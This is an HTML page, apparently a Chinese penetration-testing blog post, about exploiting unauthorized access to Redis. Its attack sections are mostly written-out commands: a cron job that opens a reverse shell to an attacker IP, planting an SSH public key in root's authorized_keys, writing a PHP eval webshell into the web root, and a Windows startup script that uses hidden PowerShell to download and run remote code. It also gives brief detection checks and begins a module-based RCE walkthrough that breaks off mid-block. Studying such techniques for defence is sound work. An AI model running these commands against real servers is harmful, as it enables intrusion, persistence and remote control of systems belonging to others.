@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>redis漏洞利用 - 剑胆琴心</title><meta name="author" content="剑胆琴心">
+<meta name="author-link" content="http://geoer.cn">
+<meta name="description" content="一些关于redis未授权访问和其它简单漏洞利用方式" /><meta name="keywords" content='渗透测试, redis, 未授权访问' /><meta itemprop="name" content="redis漏洞利用">
+<meta itemprop="description" content="一些关于redis未授权访问和其它简单漏洞利用方式"><meta itemprop="datePublished" content="2020-05-26T09:52:09+08:00" />
+<meta itemprop="dateModified" content="2023-01-21T16:47:23+08:00" />
+<meta itemprop="wordCount" content="2011"><meta itemprop="image" content="https://geoer.cn/logo.png"/>
+<meta itemprop="keywords" content="渗透测试,redis,未授权访问," /><meta property="og:title" content="redis漏洞利用" />
+<meta property="og:description" content="一些关于redis未授权访问和其它简单漏洞利用方式" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://geoer.cn/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" /><meta property="og:image" content="https://geoer.cn/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-26T09:52:09+08:00" />
+<meta property="article:modified_time" content="2023-01-21T16:47:23+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://geoer.cn/logo.png"/>
+
+<meta name="twitter:title" content="redis漏洞利用"/>
+<meta name="twitter:description" content="一些关于redis未授权访问和其它简单漏洞利用方式"/>
+<meta name="application-name" content="剑胆琴心">
+<meta name="apple-mobile-web-app-title" content="剑胆琴心"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://geoer.cn/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" /><link rel="prev" href="https://geoer.cn/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/" /><link rel="next" href="https://geoer.cn/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "redis漏洞利用",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/geoer.cn\/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\/"
+    },"image": [{
+              "@type": "ImageObject",
+              "url": "https:\/\/geoer.cn\/images\/Apple-Devices-Preview.jpg",
+              "width":  1842 ,
+              "height":  1036 
+            }],"genre": "posts","keywords": "渗透测试, redis, 未授权访问","wordcount":  2011 ,
+    "url": "https:\/\/geoer.cn\/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\/","datePublished": "2020-05-26T09:52:09+08:00","dateModified": "2023-01-21T16:47:23+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "剑胆琴心","logo": {
+          "@type": "ImageObject",
+          "url": "https:\/\/geoer.cn\/images\/avatar.png",
+          "width":  438 ,
+          "height":  438 
+        }},"author": {
+        "@type": "Person",
+        "name": "剑胆琴心"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tests/"
+                title="FixIt 测试"
+                
+              ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="剑胆琴心"><img
+    class="lazyload logo"
+    src="/svg/loading.min.svg"
+    data-src="/images/avatar.png"
+    data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+    data-sizes="auto"
+    alt="/images/avatar.png"
+    title="/images/avatar.png" width="438" height="438"/><span class="header-title-text">剑胆琴心</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容 ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tests/"
+                  title="FixIt 测试"
+                  
+                ><i class="fa-solid fa-flask fa-fw fa-sm" aria-hidden="true"></i> 测试</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/shuai06"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>redis漏洞利用</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="http://geoer.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
+    class="lazyload avatar"
+    src="/svg/loading.min.svg"
+    data-src="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp"
+    data-srcset="https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 1.5x, https://./avatar/0f8538ba0036972bb22ac39c1aeb6f26?s=32&amp;d=mp 2x"
+    data-sizes="auto"
+    alt="剑胆琴心"
+    title="剑胆琴心"/>&nbsp;剑胆琴心</a></span>
+          <span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 渗透测试</a></span></div>
+      <div class="post-meta-line"><span title=2020-05-26&#32;09:52:09><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-05-26">2020-05-26</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2011 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 5 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="redis漏洞利用">
+              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#准备">准备</a></li>
+    <li><a href="#测试">测试</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#一写文件利用未授权访问">一、写文件(利用未授权访问)</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#1crontab计划任务反弹shell">1.crontab计划任务反弹shell</a></li>
+                    <li><a href="#2直接写入公钥">2.直接写入公钥</a></li>
+                    <li><a href="#3低权限写入webshell">3.低权限写入WebShell</a></li>
+                    <li><a href="#4开机自启目录">4.开机自启目录</a></li>
+                    <li><a href="#5写入挖矿进程">5.写入挖矿进程</a></li>
+                    <li><a href="#nmap检测">nmap检测</a></li>
+                    <li><a href="#安全检查">安全检查</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#二redis-rce">二、Redis-RCE</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#1redis主从同步rce">1.redis主从同步rce</a></li>
+                    <li><a href="#2反序列化rce">2.反序列化rce</a></li>
+                    <li><a href="#3lua-rce">3.lua rce</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#三redis密码爆破">三、redis密码爆破</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#防御手段">防御手段</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="准备">准备</h2>
+<p>1.下载编译</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://download.redis.io/releases/redis-6.0.3.tar.gz
+</span></span><span class="line"><span class="cl">tar xzf redis-6.0.3.tar.gz
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> redis-6.0.3
+</span></span><span class="line"><span class="cl">make
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.拷贝二进制文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> src/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cp redis-server /usr/bin 
+</span></span><span class="line"><span class="cl">cp redis-cli /usr/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">cp redis.conf /etc/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.修改<code>redis.conf</code>, 开启外部访问，关闭保护模式(保护模式下运行redis是利用不成功滴)</p>
+<img src="http://image.xpshuai.cn/20200525210801776_1038672757.png"/>
+<p>4.启动redis服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">redis-server  /etc/redis.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 或者直接以非保护模式运行也可以</span>
+</span></span><span class="line"><span class="cl">./redis_server --protected-mode no
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>5.连接redis的方式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># nc</span>
+</span></span><span class="line"><span class="cl">nc 1.1.1.1.10 <span class="m">6379</span> -vv    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># telent </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#或redis-cli连接</span>
+</span></span><span class="line"><span class="cl">redis-cli -h 192.168.0.100
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>常用命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 查看里面的key和其对应的值</span>
+</span></span><span class="line"><span class="cl">keys *  
+</span></span><span class="line"><span class="cl">get key
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取备份路径</span>
+</span></span><span class="line"><span class="cl">config get dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取备份文件名</span>
+</span></span><span class="line"><span class="cl">config get dbfilename
+</span></span><span class="line"><span class="cl">save  <span class="c1"># 保存数据到备份路径(dir+dbfilename)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置备份路径</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /root/ <span class="c1"># 可以移动到root，然后访问（如果能访问，就是root权限 --&gt;可用来判断权限）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置备份文件名</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename filename
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置键值对</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> keyname value
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取键值对</span>
+</span></span><span class="line"><span class="cl">get keyname
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 持久化(保存到磁盘)</span>
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="测试">测试</h2>
+<h4 id="一写文件利用未授权访问">一、写文件(利用未授权访问)</h4>
+<p>测试环境：centos</p>
+<h6 id="1crontab计划任务反弹shell">1.crontab计划任务反弹shell</h6>
+<blockquote>
+<p>root权限运行redis</p>
+</blockquote>
+<p>1.本机监听端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvvp <span class="m">4444</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.利用redis生成计划任务配置文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> -.- <span class="s2">&#34;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.106/5555 0&gt;&amp;1\n\n\n&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /var/spool/cron/
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename root
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.本机获得反弹shell</p>
+<p><strong>Note:</strong>
+当目标主机为centos时可以反弹shell, 而ubuntu和debian均无法成功反弹shell。
+原因：由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划。</p>
+<h6 id="2直接写入公钥">2.直接写入公钥</h6>
+<blockquote>
+<p>root权限运行redis， 且目标主机开启了ssh密钥登录</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 本机先生成密钥</span>
+</span></span><span class="line"><span class="cl">ssh-keygen -t rsa
+</span></span><span class="line"><span class="cl"><span class="c1"># 公钥内容导入key.txt文件</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat /root/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; key.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /root/.ssh/
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename authorized_keys
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> test6 <span class="s2">&#34;\n\n\nssh key\n\n\n ssh-rsa xxxxxxxxxxxxx&#34;</span> <span class="o">(</span>公钥的值<span class="o">)</span>
+</span></span><span class="line"><span class="cl">save
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 然后本机直接连接目标</span>
+</span></span><span class="line"><span class="cl">ssh  -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no 192.168.0.100
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同时也要注意系统的乱码问题</p>
+<img src="http://image.xpshuai.cn/20200525224703847_1050926657.png"/>
+<h6 id="3低权限写入webshell">3.低权限写入WebShell</h6>
+<blockquote>
+<p>需要知道网站路径</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">config <span class="nb">set</span> dir /var/www/html/    <span class="c1"># 需要知道网站的绝对路径</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename 1.php
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="m">1</span> <span class="s2">&#34;&lt;?php eval(</span><span class="nv">$_POST</span><span class="s2">[1]); ?&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 访问webshell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="http://image.xpshuai.cn/20200525222440751_1498038879.png"/>
+<h6 id="4开机自启目录">4.开机自启目录</h6>
+<blockquote>
+<p>前提：redis部署在windows主机上</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 写入批处理文件到Administrator用户的开机启动目录</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用powershell远程下载执行我们的程序</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir <span class="s2">&#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename add.bat
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> xx <span class="s2">&#34;\r\n\r\npowershell.exe -nop -w hidden -c \&#34;IEX((New-ObjectNet.WebClient).DownloadString(&#39;http://xxx.xx.xxxx/add&#39;))\&#34;\r\n\r\n&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>拓展攻击方法</strong></p>
+<ul>
+<li>信息泄漏(很多redis没设置密码，寻找敏感信息)</li>
+<li>配合ssrf</li>
+<li>本地lua代码</li>
+<li>本地提权</li>
+<li>等等</li>
+</ul>
+<h6 id="5写入挖矿进程">5.写入挖矿进程</h6>
+<h6 id="nmap检测">nmap检测</h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p <span class="m">6379</span> --script redis-info 192.168.0.100
+</span></span><span class="line"><span class="cl"><span class="c1">#地址:https://svn.nmap.org/nmap/scripts/redis-info.nse</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="http://image.xpshuai.cn/20200525225557672_1832619508.png"/>
+<h6 id="安全检查">安全检查</h6>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#1.查看redis运行的用户权限</span>
+</span></span><span class="line"><span class="cl">ps -aux <span class="p">|</span>grep redis
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#2.查看所有用户ssh验证文件是否异常</span>
+</span></span><span class="line"><span class="cl">/user/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#3.查看crontab</span>
+</span></span><span class="line"><span class="cl">/var/spoof/cron/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#4.查看crontab的日志</span>
+</span></span><span class="line"><span class="cl">tail /var/log/cron
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="二redis-rce">二、Redis-RCE</h4>
+<p>利用用前提是获取redis访问权限,也就是基于redis未授权访问</p>
+<h6 id="1redis主从同步rce">1.redis主从同步rce</h6>
+<blockquote>
+<p>使用范围redis 4.x-5.0.5</p>
+</blockquote>
+<p>在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/Ridter/redis-rce.git
+</span></span><span class="line"><span class="cl">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 编译so文件</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> RedisModules-ExecuteCommand/
+</span></span><span class="line"><span class="cl">make
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 运行sss</span>
